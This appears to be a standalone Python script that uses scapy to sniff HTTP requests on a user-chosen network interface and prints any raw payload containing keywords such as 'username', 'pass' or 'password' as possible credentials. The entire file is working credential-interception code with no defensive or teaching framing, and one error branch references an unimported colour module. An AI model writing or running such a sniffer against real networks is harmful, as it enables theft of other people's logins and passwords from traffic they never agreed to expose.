import scapy.all as scapy
from scapy_http import http
import re
import subprocess
def creds(interface):
    scapy.sniff(iface=interface,store=False,prn=sniff_print)
def sniff_print(packet):
    if packet.haslayer(http.HTTPRequest):
        print(str(packet[http.HTTPRequest].Referer))
        if packet.haslayer(scapy.Raw):
            loadd=packet[scapy.Raw].load
            keywords=["username","uname","login","cred","credential","credentials","id","user","pass","password","upass","name"]
            for keyword in keywords:
                if keyword in str(loadd):
                    print("\n\n")
                    print("[+][+] the possible username and password >>> " + str(loadd))
                    print("\n\n")
                    print("-------------------------------------------------------------------------------------\n")
                    break

def get_iface():
    final_interface = []
    print("The available Interfaces for this device are:\n")
    search_interface = subprocess.check_output(["ifconfig"])
    available_interface = re.search(r"\w{3,7}:\s", str(search_interface))
    available_interface2 = re.findall(r"[n]\w{3,7}:\s", str(search_interface))
    for elements in available_interface2:
        final_interface.append(elements[1:-2])
    final_interface.append(available_interface.group(0)[:-2])
    for ele in final_interface:
        print(ele, end="\t\t\t")
    print("\n")
    return final_interface
def check_interface(interface , final_interface):
    if interface not in final_interface:
        print('[-] Hey! you do not have "' +interface + '" in your machine.Choose the correct interface \n')
        return 0
    if not interface:
        print(Fore.YELLOW + "[!]", Fore.RED + "NO interface provided. Please provide correct interface")
        return 0
    return interface
final_interface=get_iface()
print("Enter the interface from above which is connected to internet\n")
interface = str(input(">>")).strip()
interface1=check_interface(interface , final_interface)
while (interface1==0):
    final_interface = get_iface()
    interface = str(input()).strip()
    interface1 = check_interface(interface,final_interface)
try:
    creds(interface1)
except KeyboardInterrupt:
    print("[+] quitting......")